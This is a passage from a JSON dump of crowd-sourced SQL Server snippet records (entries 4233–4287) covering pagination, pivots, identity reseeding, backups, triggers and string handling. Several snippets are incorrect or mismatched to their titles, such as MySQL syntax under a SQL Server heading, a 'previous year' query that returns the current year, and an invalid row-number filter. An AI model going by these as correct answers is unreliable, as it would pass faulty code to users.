    "description": "docker run -d --name MySQLServer -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=your_password' -p 1433:1433 mcr.microsoft.com/azure-sql-edge \n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4233,
    "keyword": null,
    "link": null,
    "title": " sql server order by nulls last",
    "description": "SELECT *FROM creditCardORDER BY CASE WHEN monthlyLimit IS NULL THEN 1 ELSE 0 END DESC, monthlyLimit DESC;\n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4234,
    "keyword": null,
    "link": null,
    "title": " sql server pagination",
    "description": "SELECT col1, col2, ...  FROM ...  WHERE ...   ORDER BY -- this is a MUST there must be ORDER BY statement -- the paging comes here OFFSET     10 ROWS       -- skip 10 rows FETCH NEXT 10 ROWS ONLY; -- take 10 rows\nSELECT * FROM SampleFruits ORDER BY Id OFFSET 0 ROWS  FETCH NEXT 7 ROWS ONLY\n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4235,
    "keyword": null,
    "link": null,
    "title": " sql server pivot rows to columns",
    "description": "SELECT *        -- Total invoices per gender FROM (     SELECT invoice, gender     FROM sales ) d PIVOT (     sum(invoice)     FOR gender IN ('F' AS \"Women\", 'M' AS \"Men\") ); -- Table Sales: CREATE TABLE sales (     gender VARCHAR2(1 BYTE),\t\t-- 'F' or 'M'     invoice NUMBER );\nselect Firstname, Amount, PostalCode, LastName, AccountNumber from (   select value, columnname   from yourtable ) d pivot (   max(value)   for columnname in (Firstname, Amount, PostalCode, LastName, AccountNumber) ) piv;\n-- Dynamic Pivot with unknown number of columnnames  DECLARE @cols AS NVARCHAR(MAX),     @query  AS NVARCHAR(MAX)  select @cols = STUFF((SELECT ',' + QUOTENAME(ColumnName)                      from yourtable                     group by ColumnName, id                     order by id             FOR XML PATH(''), TYPE             ).value('.', 'NVARCHAR(MAX)')          ,1,1,'')  set @query = N'SELECT ' + @cols + N' from               (                 select value, ColumnName                 from yourtable             ) x             pivot              (                 max(value)                 for ColumnName in (' + @cols + N')             ) p '  exec sp_executesql @query;\n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4236,
    "keyword": null,
    "link": null,
    "title": " sql server query database space available",
    "description": "SELECT DB_NAME() AS DbName,      name AS FileName,      type_desc,     size/128.0 AS CurrentSizeMB,       size/128.0 - CAST(FILEPROPERTY(name, 'SpaceUsed') AS INT)/128.0 AS FreeSpaceMB FROM sys.database_files WHERE type IN (0,1);\n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4237,
    "keyword": null,
    "link": null,
    "title": " sql server query for datediff",
    "description": "-- DOES NOT ACCOUNT FOR LEAP YEARS DECLARE @date1 DATETIME, @date2 DATETIME, @result VARCHAR(100); DECLARE @years INT, @months INT, @days INT,     @hours INT, @minutes INT, @seconds INT, @milliseconds INT;  SET @date1 = '1900-01-01 00:00:00.000' SET @date2 = '2018-12-12 07:08:01.123'  SELECT @years = DATEDIFF(yy, @date1, @date2) IF DATEADD(yy, -@years, @date2) < @date1  SELECT @years = @years-1 SET @date2 = DATEADD(yy, -@years, @date2)  SELECT @months = DATEDIFF(mm, @date1, @date2) IF DATEADD(mm, -@months, @date2) < @date1  SELECT @months=@months-1 SET @date2= DATEADD(mm, -@months, @date2)  SELECT @days=DATEDIFF(dd, @date1, @date2) IF DATEADD(dd, -@days, @date2) < @date1  SELECT @days=@days-1 SET @date2= DATEADD(dd, -@days, @date2)  SELECT @hours=DATEDIFF(hh, @date1, @date2) IF DATEADD(hh, -@hours, @date2) < @date1  SELECT @hours=@hours-1 SET @date2= DATEADD(hh, -@hours, @date2)  SELECT @minutes=DATEDIFF(mi, @date1, @date2) IF DATEADD(mi, -@minutes, @date2) < @date1  SELECT @minutes=@minutes-1 SET @date2= DATEADD(mi, -@minutes, @date2)  SELECT @seconds=DATEDIFF(s, @date1, @date2) IF DATEADD(s, -@seconds, @date2) < @date1  SELECT @seconds=@seconds-1 SET @date2= DATEADD(s, -@seconds, @date2)  SELECT @milliseconds=DATEDIFF(ms, @date1, @date2)  SELECT @result= ISNULL(CAST(NULLIF(@years,0) AS VARCHAR(10)) + ' years,','')      + ISNULL(' ' + CAST(NULLIF(@months,0) AS VARCHAR(10)) + ' months,','')          + ISNULL(' ' + CAST(NULLIF(@days,0) AS VARCHAR(10)) + ' days,','')      + ISNULL(' ' + CAST(NULLIF(@hours,0) AS VARCHAR(10)) + ' hours,','')      + ISNULL(' ' + CAST(@minutes AS VARCHAR(10)) + ' minutes and','')      + ISNULL(' ' + CAST(@seconds AS VARCHAR(10))       + CASE             WHEN @milliseconds > 0                 THEN '.' + CAST(@milliseconds AS VARCHAR(10))              ELSE ''        END       + ' seconds','')  SELECT @result \n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4238,
    "keyword": null,
    "link": null,
    "title": " sql server read uncommitted",
    "description": "SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED\n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4239,
    "keyword": null,
    "link": null,
    "title": " sql server remove 0 from left",
    "description": "  SUBSTRING(str_col, PATINDEX('%[^0]%', str_col+'.'), LEN(str_col))\n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4240,
    "keyword": null,
    "link": null,
    "title": " sql server remove enter from string",
    "description": "SELECT REPLACE(REPLACE(@str, CHAR(13), ''), CHAR(10), '')\n",
    "reg_date": "2021-10-12T10:00:46.000Z"
  },
  {
    "id": 4241,
    "keyword": null,
    "link": null,
    "title": " sql server rename database",
    "description": "ALTER DATABASE MyTestDatabase MODIFY NAME = MyTestDatabaseCopy ; \nUSE master;   GO   ALTER DATABASE MyTestDatabase SET SINGLE_USER WITH ROLLBACK IMMEDIATE GO ALTER DATABASE MyTestDatabase MODIFY NAME = MyTestDatabaseCopy ; GO   ALTER DATABASE MyTestDatabaseCopy SET MULTI_USER GO\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4242,
    "keyword": null,
    "link": null,
    "title": " sql server rename mdf file",
    "description": "USE [master]; GO  ALTER DATABASE QuestelServicesDirectValidation_ORIG SET SINGLE_USER WITH ROLLBACK IMMEDIATE GO  ALTER DATABASE QuestelServicesDirectValidation_ORIG SET OFFLINE GO  ALTER DATABASE QuestelServicesDirectValidation_ORIG MODIFY FILE (Name='QuestelServicesDirectValidation_ORIG', FILENAME='C:\\Program Files\\Microsoft SQL Server\\MSSQL13.MSSQLSERVER\\MSSQL\\DATA\\QuestelServicesDirectValidation_ORIG.mdf') GO  ALTER DATABASE QuestelServicesDirectValidation_ORIG MODIFY FILE (Name='QuestelServicesDirectValidation_ORIG_log', FILENAME='C:\\Program Files\\Microsoft SQL Server\\MSSQL13.MSSQLSERVER\\MSSQL\\DATA\\QuestelServicesDirectValidation_ORIG_log.ldf') GO  ALTER DATABASE QuestelServicesDirectValidation_ORIG SET ONLINE GO  ALTER DATABASE QuestelServicesDirectValidation_ORIG SET MULTI_USER GO\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4243,
    "keyword": null,
    "link": null,
    "title": " sql server reset auto increment",
    "description": "ALTER TABLE tmp AUTO_INCREMENT = 3;\nDBCC CHECKIDENT (mytable, RESEED, 0)\nALTER TABLE tablename AUTO_INCREMENT = 1\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4244,
    "keyword": null,
    "link": null,
    "title": " sql server reset identity",
    "description": "\tDBCC CHECKIDENT ('table name', RESEED , 0)\nUSE AdventureWorks2012;   GO   DBCC CHECKIDENT ('Person.AddressType', RESEED, 10);   GO   \nDBCC CHECKIDENT ('YourTableName', RESEED, 1)\n/*If you have delete all the rows in a table, and you want to reset the identity column value, use this*/ DBCC CHECKIDENT ('Table_Name',RESEED,0)\nUSE <databasename>;   GO   DBCC CHECKIDENT ('<tablename>.<columnname>', <value>, <incrementby>);   GO \n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4245,
    "keyword": null,
    "link": null,
    "title": " sql server reset sequence",
    "description": "ALTER SEQUENCE Test.CountBy1 RESTART WITH 1 ;   \n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4246,
    "keyword": null,
    "link": null,
    "title": " sql server restore database",
    "description": "--Step 1: Check the logical file names with the help of the following command:    RESTORE FILELISTONLY    FROM DISK = 'E:\\DBBackups\\mydb.bak'  --Step 2: Use the logical names you get from the above query in the below query:    RESTORE DATABASE [mydb_new]   FILE = N'<MDFLogicalName>'    FROM DISK = N'E:\\DBBackups\\mydb.bak'   WITH FILE = 1 \t  ,NOUNLOAD \t  ,STATS = 10 \t  ,MOVE N'<MDFLogicalname>' TO N'E:\\DBBackups\\mydb_new.mdf' \t  ,MOVE N'<LDFLogicalName>' TO N'E:\\DBBackups\\mydb_new_0.ldf'\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4247,
    "keyword": null,
    "link": null,
    "title": " sql server roles and users",
    "description": "-- SQL Server: list of users and roles SELECT dp.NAME      AS principal_name,        dp.TYPE_DESC AS principal_type_desc,        o.NAME       AS object_name,        p.PERMISSION_NAME,        p.STATE_DESC AS permission_state_desc FROM sys.database_permissions p          LEFT OUTER JOIN sys.all_objects o                          ON p.MAJOR_ID = o.OBJECT_ID          INNER JOIN sys.database_principals dp                     ON p.GRANTEE_PRINCIPAL_ID = dp.PRINCIPAL_ID;\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4248,
    "keyword": null,
    "link": null,
    "title": " sql server rtrim everything after character",
    "description": "SELECT   [FullName] \t    ,LEFT([FullName], CHARINDEX(',', [FullName]) - 1) AS [Surname] \t    ,REPLACE(SUBSTRING([FullName], CHARINDEX(',', [FullName]), LEN([FullName])), ',', '') AS [FirstName] FROM    Employee\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4249,
    "keyword": null,
    "link": null,
    "title": " sql server search column name in all tables",
    "description": "SELECT      COLUMN_NAME AS 'ColumnName'             ,TABLE_NAME AS  'TableName' FROM        INFORMATION_SCHEMA.COLUMNS WHERE       COLUMN_NAME LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\nSELECT      c.name  AS 'ColumnName'             ,t.name AS 'TableName' FROM        sys.columns c JOIN        sys.tables  t   ON c.object_id = t.object_id WHERE       c.name LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4250,
    "keyword": null,
    "link": null,
    "title": " sql server select first day of previous year",
    "description": "SELECT DATEFROMPARTS ( DATEPART(yyyy, GETDATE()) - 1, 1, 1 )\nSELECT DATEADD(yy, DATEDIFF(yy, 0, GETDATE()), 0)\n",
    "reg_date": "2021-10-12T10:00:47.000Z"
  },
  {
    "id": 4251,
    "keyword": null,
    "link": null,
    "title": " sql server select furst day of current year",
    "description": "SELECT DATEADD(yy, DATEDIFF(yy, 0, GETDATE()), 0)\n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4252,
    "keyword": null,
    "link": null,
    "title": " sql server select record with max id",
    "description": "select ID , ProductCatId , ProductCode , Price   from (         select ID , ProductCatId , ProductCode , Price, row_number() over (partition by ProductCatId order by ID desc) as rn          from myTable         ) as t   where t.rn = 1 \n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4253,
    "keyword": null,
    "link": null,
    "title": " sql server select rows by distinct column",
    "description": "SELECT a.* FROM emails a INNER JOIN    (SELECT email,     MIN(id) as id   FROM emails    GROUP BY email  ) AS b   ON a.email = b.email    AND a.id = b.id;\n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4254,
    "keyword": null,
    "link": null,
    "title": " sql server select top 2 of each group",
    "description": "SELECT * FROM  ( SELECT column1,  column2, cloumn3,  row_number() over (PARTITION BY ColumnToGroupBy ORDER BY ColumnToOrderBy DESC) AS TempColumnName FROM cities ) AS TempTableName WHERE TempTableName <= 2 \n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4255,
    "keyword": null,
    "link": null,
    "title": " sql server select value large text",
    "description": "SELECT CONVERT(XML, [column_here]) AS [Value] FROM [TABLE]   SELECT CAST('<![CDATA[' + CAST(column_here as nvarchar(max)) + ']]>' AS XML) FROM [TABLE] \n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4256,
    "keyword": null,
    "link": null,
    "title": " sql server select where date",
    "description": "select * from test where cast ([date] as date) = '03/19/2014'; \n select * from test   where datediff(day, date, '03/19/2014') = 0\n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4257,
    "keyword": null,
    "link": null,
    "title": " sql server stored procedure",
    "description": "CREATE PROCEDURE spGetEmployeeCountByGender @Gender nvarchar(20), @EmployeeCount int Output AS BEGIN SELECT @EmployeeCount = COUNT(Id)  FROM tblEmployee  WHERE Gender = @Gender END\nIF OBJECT_ID ( 'Production.uspGetList', 'P' ) IS NOT NULL        DROP PROCEDURE Production.uspGetList;   GO   CREATE PROCEDURE Production.uspGetList @Product varchar(40)        , @MaxPrice money        , @ComparePrice money OUTPUT       , @ListPrice money OUT   AS       SET NOCOUNT ON;       SELECT p.[Name] AS Product, p.ListPrice AS 'List Price'       FROM Production.Product AS p       JOIN Production.ProductSubcategory AS s          ON p.ProductSubcategoryID = s.ProductSubcategoryID       WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice;   -- Populate the output variable @ListPprice.   SET @ListPrice = (SELECT MAX(p.ListPrice)           FROM Production.Product AS p           JOIN  Production.ProductSubcategory AS s              ON p.ProductSubcategoryID = s.ProductSubcategoryID           WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice);   -- Populate the output variable @compareprice.   SET @ComparePrice = @MaxPrice;   GO   \n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4258,
    "keyword": null,
    "link": null,
    "title": " sql server stored procedure return resultset",
    "description": "CREATE PROC myproc AS  BEGIN      SELECT name FROM SYSOBJECTS END go  DECLARE @t TABLE (name varchar(100)) INSERT @t (name) exec myproc\n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4259,
    "keyword": null,
    "link": null,
    "title": " sql server stored procedure return value to variable",
    "description": "CREATE PROC myproc AS  BEGIN      SELECT name FROM SYSOBJECTS END go  DECLARE @t TABLE (name varchar(100)) INSERT @t (name) exec myproc\n",
    "reg_date": "2021-10-12T10:00:48.000Z"
  },
  {
    "id": 4260,
    "keyword": null,
    "link": null,
    "title": " sql server substring",
    "description": "SELECT SUBSTRING('SQL Tutorial', 1, 3) AS ExtractString;\n-- substr(string, start, [, length ]) SELECT substr('Hello World', 1, 3) ;      -- Hel SELECT substr('Hello World', 4, 5) ;      -- lo Wo SELECT substr('Hello World', 4);          -- lo World SELECT substr('Hello World', -3);         -- rld\nSUBSTRING(string, start, length)\nSELECT      SUBSTRING('SQLTutorial.org',         POSITION('.' IN 'SQLTutorial.org'));\nSELECT SUBSTR(first_name, 0 , 3) From employees;\nSELECT SUBSTRING('SQL Tutorial', 4, (LENGTH('SQL Tutorial'))                   AS LastCharactersString; //Result -> Tutorial\n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4261,
    "keyword": null,
    "link": null,
    "title": " sql server table size",
    "description": " /******* Calcula tamany de totes les taules  *********/ SELECT      s.Name AS SchemaName,     t.NAME AS TableName,     p.rows AS RowCounts,     CAST(ROUND(((SUM(a.total_pages) * 8) / 1024.00), 2) AS NUMERIC(36, 2)) AS TotalSpaceMB,     CAST(ROUND(((SUM(a.used_pages) * 8) / 1024.00), 2) AS NUMERIC(36, 2)) AS UsedSpaceMB,      CAST(ROUND(((SUM(a.total_pages) - SUM(a.used_pages)) * 8) / 1024.00, 2) AS NUMERIC(36, 2)) AS UnusedSpaceMB,     SUM(a.total_pages) * 8 AS TotalSpaceKB,      SUM(a.used_pages) * 8 AS UsedSpaceKB,      (SUM(a.total_pages) - SUM(a.used_pages)) * 8 AS UnusedSpaceKB FROM      sys.tables t INNER JOIN           sys.indexes i ON t.OBJECT_ID = i.object_id INNER JOIN      sys.partitions p ON i.object_id = p.OBJECT_ID AND i.index_id = p.index_id INNER JOIN      sys.allocation_units a ON p.partition_id = a.container_id LEFT OUTER JOIN      sys.schemas s ON t.schema_id = s.schema_id WHERE      t.NAME NOT LIKE 'dt%'      AND t.is_ms_shipped = 0     AND i.OBJECT_ID > 255  GROUP BY      t.Name, s.Name, p.Rows ORDER BY        TotalSpaceMB desc ;   /************ Calcula tamany dels indexos ****************/ SELECT       OBJECT_NAME(i.OBJECT_ID)     AS NomTaula     , i.name                       AS NomIndex     , SUM(a.used_pages) * 8 / 1024 AS TamanyMB FROM \t  sys.indexes          AS i \t, sys.partitions       AS p \t, sys.allocation_units AS a WHERE \t  i.OBJECT_ID     = p.OBJECT_ID   AND i.index_id      = p.index_id   AND p.partition_id  = a.container_id   AND i.is_primary_key = 0 -- excloure PK's GROUP BY       i.OBJECT_ID     , i.index_id     , i.name ORDER BY \tTamanyMB DESC,     NomTaula,     i.index_id ; \n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4262,
    "keyword": null,
    "link": null,
    "title": " sql server throw exception",
    "description": "THROW 51000, 'The record does not exist.', 1;   \nUSE tempdb;   GO   CREATE TABLE dbo.TestRethrow   (    ID INT PRIMARY KEY   );   BEGIN TRY       INSERT dbo.TestRethrow(ID) VALUES(1);   --  Force error 2627, Violation of PRIMARY KEY constraint to be raised.       INSERT dbo.TestRethrow(ID) VALUES(1);   END TRY   BEGIN CATCH          PRINT 'In catch block.';       THROW;   END CATCH;      \n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4263,
    "keyword": null,
    "link": null,
    "title": " sql server time stamp",
    "description": "SELECT SYSDATETIME()       ,SYSDATETIMEOFFSET()       ,SYSUTCDATETIME()       ,CURRENT_TIMESTAMP       ,GETDATE()       ,GETUTCDATE();   /* Returned:   SYSDATETIME()      2007-04-30 13:10:02.0474381   SYSDATETIMEOFFSET()2007-04-30 13:10:02.0474381 -07:00   SYSUTCDATETIME()   2007-04-30 20:10:02.0474381   CURRENT_TIMESTAMP  2007-04-30 13:10:02.047   GETDATE()          2007-04-30 13:10:02.047   GETUTCDATE()       2007-04-30 20:10:02.047   */ \nSELECT CONVERT (DATE, SYSDATETIME())       ,CONVERT (DATE, SYSDATETIMEOFFSET())       ,CONVERT (DATE, SYSUTCDATETIME())       ,CONVERT (DATE, CURRENT_TIMESTAMP)       ,CONVERT (DATE, GETDATE())       ,CONVERT (DATE, GETUTCDATE());      /* Returned    SYSDATETIME()      2007-05-03   SYSDATETIMEOFFSET()2007-05-03   SYSUTCDATETIME()   2007-05-04   CURRENT_TIMESTAMP  2007-05-03   GETDATE()          2007-05-03   GETUTCDATE()       2007-05-04   */   \n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4264,
    "keyword": null,
    "link": null,
    "title": " sql server to uppercase",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\nSELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\nSELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4265,
    "keyword": null,
    "link": null,
    "title": " sql server today minus n",
    "description": "SELECT GETDATE() - 1\n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4266,
    "keyword": null,
    "link": null,
    "title": " sql server trigger after insert, update specific column",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4267,
    "keyword": null,
    "link": null,
    "title": " sql server tutorial cursor",
    "description": "                                     DECLARE      @product_name VARCHAR(MAX),      @list_price   DECIMAL;  DECLARE cursor_product CURSOR FOR SELECT          product_name,          list_price     FROM          production.products;  OPEN cursor_product;  FETCH NEXT FROM cursor_product INTO      @product_name,      @list_price;  WHILE @@FETCH_STATUS = 0     BEGIN         PRINT @product_name + CAST(@list_price AS varchar);         FETCH NEXT FROM cursor_product INTO              @product_name,              @list_price;     END;  CLOSE cursor_product;  DEALLOCATE cursor_product; \nDECLARE @name VARCHAR(50) -- database name  DECLARE @path VARCHAR(256) -- path for backup files  DECLARE @fileName VARCHAR(256) -- filename for backup  DECLARE @fileDate VARCHAR(20) -- used for file name   SET @path = 'C:\\Backup\\'   SELECT @fileDate = CONVERT(VARCHAR(20),GETDATE(),112)   DECLARE db_cursor CURSOR FOR  SELECT name  FROM MASTER.dbo.sysdatabases  WHERE name NOT IN ('master','model','msdb','tempdb')   OPEN db_cursor   FETCH NEXT FROM db_cursor INTO @name    WHILE @@FETCH_STATUS = 0   BEGIN         SET @fileName = @path + @name + '_' + @fileDate + '.BAK'        BACKUP DATABASE @name TO DISK = @fileName         FETCH NEXT FROM db_cursor INTO @name  END   CLOSE db_cursor   DEALLOCATE db_cursor \n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4268,
    "keyword": null,
    "link": null,
    "title": " sql server union all example",
    "description": "SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION ALL SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions];\n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4269,
    "keyword": null,
    "link": null,
    "title": " sql server update c# example code",
    "description": "string name = \"test1\"; int id = 1; using (SqlConnection cnn = new SqlConnection(\"Server=localhost;Database=DEV;User Id=test;Password=test!@#$;Connect Timeout=5400\")) {   cnn.Open();   string querystr = \"UPDATE [dbo].[TABLE] SET [name]=@p_name WHERE [id]=@p_id\";   using (var cmd = new SqlCommand(querystr, cnn))   {      //set value        cmd.Parameters.AddWithValue(\"@p_name\", name);      //where with id      cmd.Parameters.AddWithValue(\"@p_id\", id);      int ret = cmd.ExecuteNonQuery();   } }\n",
    "reg_date": "2021-10-12T10:00:49.000Z"
  },
  {
    "id": 4270,
    "keyword": null,
    "link": null,
    "title": " sql server update column based on another table",
    "description": "UPDATE     Sales_Import SET     Sales_Import.AccountNumber = RAN.AccountNumber FROM     Sales_Import SI INNER JOIN     RetrieveAccountNumber RAN ON      SI.LeadID = RAN.LeadID; \n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4271,
    "keyword": null,
    "link": null,
    "title": " sql server update multiple columns at once",
    "description": "UPDATE Person.Person  Set FirstName = 'Kenneth'     ,LastName =  'Smith'  WHERE BusinessEntityID = 1\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4272,
    "keyword": null,
    "link": null,
    "title": " sql server update to null",
    "description": "Update myTable set MyColumn = NULL\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4273,
    "keyword": null,
    "link": null,
    "title": " sql server user permissions and roles",
    "description": "-- SQL Server: list of users and roles SELECT dp.NAME      AS principal_name,        dp.TYPE_DESC AS principal_type_desc,        o.NAME       AS object_name,        p.PERMISSION_NAME,        p.STATE_DESC AS permission_state_desc FROM sys.database_permissions p          LEFT OUTER JOIN sys.all_objects o                          ON p.MAJOR_ID = o.OBJECT_ID          INNER JOIN sys.database_principals dp                     ON p.GRANTEE_PRINCIPAL_ID = dp.PRINCIPAL_ID;\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4274,
    "keyword": null,
    "link": null,
    "title": " sql server utc to local",
    "description": "select CONVERT(datetime, SWITCHOFFSET(dateTimeField, DATEPART(TZOFFSET,  dateTimeField AT TIME ZONE 'Eastern Standard Time')))\nSELECT \t['TIME COLUM TO CONVERT'] AS [UTC_TIME], \tDATEADD(hh, DATEDIFF(hh, GETUTCDATE(), GETDATE()),['TIME COLUM TO CONVERT']) AS [lOCAL_TIME] FROM ['TABLE NAME']\nselect   [MyUtcDate] + getdate() - getutcdate() from [dbo].[mytable]\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4275,
    "keyword": null,
    "link": null,
    "title": " sql server version query",
    "description": "SELECT @@VERSION AS 'SQL Server Version';  \nSELECT @@version\nRelease\t\t\t\tBuildversion SQL Server 2019\t\t15.0.4073.23 SQL Server 2017\t\t14.0.1000.169 SQL Server 2016\t\t13.0.1601.5 SQL Server 2014\t\t12.0.2000.8 SQL Server 2012\t\t11.0.2100.60 \n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4276,
    "keyword": null,
    "link": null,
    "title": " sql server week number",
    "description": "datepart(wk, DateToParse)\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4277,
    "keyword": null,
    "link": null,
    "title": " sql set",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE table SET nom_colonne_1 = 'nouvelle valeur' WHERE condition\nSQL> UPDATE CUSTOMERS SET ADDRESS = 'Pune' WHERE ID = 6;\nUsed alongside UPDATE to update existing data in a table. Example: Updates the value and quantity values for an order with an id of 642 in the orders table. UPDATE orders SET value = 19.49, quantity = 2 WHERE id = 642;\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4278,
    "keyword": null,
    "link": null,
    "title": " sql several or",
    "description": "WHERE id IN (3, 9, 100, ...)\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4279,
    "keyword": null,
    "link": null,
    "title": " sql show all users",
    "description": "#For the SQL Server Owner, you should be able to use: select suser_sname(owner_sid) as 'Owner', state_desc, * from sys.databases  #For a list of SQL Users: select * from master.sys.server_principals\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4280,
    "keyword": null,
    "link": null,
    "title": " sql show tables",
    "description": "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nSHOW TABLES FROM database\nBY LOVE SINGH  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nShowing all table:  show tables;  Showing table data: SELECT * or column_names FROM table_name;\nSELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG=db_name()  and TABLE_NAME like'%table_name%'--to check particular table\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4281,
    "keyword": null,
    "link": null,
    "title": " sql skip the first row",
    "description": "SELECT * FROM table WHERE something = 'whatever' LIMIT 10 OFFSET 1;\n",
    "reg_date": "2021-10-12T10:00:50.000Z"
  },
  {
    "id": 4282,
    "keyword": null,
    "link": null,
    "title": " sql sort ages",
    "description": "SELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4283,
    "keyword": null,
    "link": null,
    "title": " sql sort ascending limit",
    "description": "SELECT name FROM column_names ORDER BY name ASC LIMIT 3;\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4284,
    "keyword": null,
    "link": null,
    "title": " sql sort column by date",
    "description": "SELECT timestamp FROM randomTable ORDER BY timestamp ASC;\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4285,
    "keyword": null,
    "link": null,
    "title": " sql split string by space",
    "description": "                                     SELECT      first_name,      last_name,     value phone FROM      sales.contacts     CROSS APPLY STRING_SPLIT(phones, ','); \nSELECT SUBSTRING('please notify the sender at the e-mail address above',0,30 + charindex(' ',SUBSTRING('please notify the sender at the e-mail address above',31,len('please notify the sender at the e-mail address above')))  )  as part1,    SUBSTRING('please notify the sender at the e-mail address above',30+ charindex(' ',SUBSTRING('please notify the sender at the e-mail address above',31,len('please notify the sender at the e-mail address above'))),len('please notify the sender at the e-mail address above')) as part2\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4286,
    "keyword": null,
    "link": null,
    "title": " sql ssrs",
    "description": "SQL Server Reporting Services(SSRS) is a reporting software that allows you to produce formatted reports with tables in the form  of data, graph, images, and charts. These reports are hosted on  a server that can be executed any time using parameters defined  by the users. It is part of Microsoft SQL Server Services suite.\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4287,
    "keyword": null,
    "link": null,
    "title": " sql stored procedure output parameter",
